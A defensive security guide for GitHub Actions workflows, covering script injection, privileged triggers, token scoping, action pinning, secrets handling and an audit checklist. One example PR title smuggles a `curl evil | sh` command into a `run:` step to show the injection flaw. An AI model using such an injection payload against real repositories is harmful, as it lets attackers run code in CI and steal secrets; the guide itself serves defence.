# Workflow security

## Script injection
`${{ }}` is expanded into the script text **before** the shell runs. Attacker-controlled values become code.

Untrusted contexts (anyone who can open a PR, issue or comment controls them):
`github.event.pull_request.title|body|head.ref|head.label`, `github.head_ref`, `github.event.issue.title|body`, `github.event.comment.body`, `github.event.review.body`, `github.event.commits[*].message|author.name|author.email`, `github.event.head_commit.message`, `github.event.pages[*].page_name`, `github.event.workflow_run.head_branch|head_commit.message`, outputs of steps that processed any of these.

Vulnerable:
```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"   # title `"; curl evil | sh; "` runs
```
Safe:
```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: printf 'Title: %s\n' "$TITLE"
```
Also unsafe: `actions/github-script` with `${{ }}` inside `script:` (pass via `env:` and read `process.env.TITLE`), and `${{ }}` in `with:` inputs of actions that eval them. Branch names can contain `$(...)` and backticks.

Writing to `$GITHUB_ENV` / `$GITHUB_OUTPUT` / `$GITHUB_PATH` from untrusted data allows env and PATH injection into later steps (e.g. `LD_PRELOAD`, `NODE_OPTIONS`). Validate or use a delimiter-safe heredoc with a random delimiter.

## Privileged triggers
| Trigger | Token / secrets | Rule |
|---|---|---|
| `pull_request` (same repo) | write-capable per `permissions`, secrets available | normal CI |
| `pull_request` (fork) | read-only, no secrets | safe for untrusted code |
| `pull_request_target` | base-repo write token, secrets | never check out `github.event.pull_request.head.sha` and run it (install, build, test, scripts, Makefiles all count) |
| `workflow_run` | write token, secrets | treat downloaded artifacts from the triggering run as untrusted data; never execute them; validate before use |
| `issue_comment` | write token, secrets | check `author_association` before acting on commands; the PR head is untrusted |

Safe pattern for "label/comment on fork PRs": `pull_request` builds and uploads a small data artifact; a `workflow_run` job reads it as data only and posts.

## Token and permissions
- Set org/repo default workflow permissions to read-only; declare per workflow.
- `actions/checkout` persists the token in `.git/config`; set `persist-credentials: false` unless later steps push.
- Avoid personal access tokens; use GitHub App installation tokens (`actions/create-github-app-token`) scoped to needed repos and permissions.
- `id-token: write` only on jobs that perform OIDC login.

## Third-party actions
- Pin to full SHA; prefer verified creators or well-maintained actions; read the source of small ones or inline them as `run:` steps.
- A tag can be moved by the owner; a SHA cannot. Pinning `@v4` alone allows silent code changes.
- Docker-based actions: pin the image digest too if the action references `docker://image:tag`.
- Restrict allowed actions in org/repo settings (`secure-repo-governance`).

## Secrets hygiene
- Masking is exact-string: transformed secrets (base64, substrings, JSON fields) are not masked; `::add-mask::` them.
- Never `set -x` in steps that handle secrets.
- Do not pass secrets to steps that run untrusted code (tests of PR code, package install scripts).
- Environment secrets are released only after environment protection rules pass; keep deploy credentials there.

## Runners
- GitHub-hosted runners are ephemeral and clean per job.
- Self-hosted: only private repos, ephemeral (`--ephemeral`) or container-isolated, separate runner groups per trust level, no long-lived cloud credentials on the host.
- Restrict outbound network where possible (egress allowlists).

## Supply-chain outputs
- Build provenance: `actions/attest-build-provenance` with `id-token: write` and `attestations: write`; verify with `gh attestation verify`.
- SBOM and signing details: `secure-supply-chain`.

## Audit checklist
- [ ] `permissions:` declared in every workflow, minimal per job
- [ ] All `uses:` pinned to SHAs; dependency bot updates them
- [ ] No `${{ }}` of untrusted contexts inside `run:` or `script:`
- [ ] No `pull_request_target` / `workflow_run` executing PR code
- [ ] Secrets scoped to environments; no PATs where an app token or OIDC works
- [ ] `persist-credentials: false` where no push is needed
- [ ] Artifacts have `retention-days`, contain no secrets
- [ ] `zizmor` and `actionlint` clean
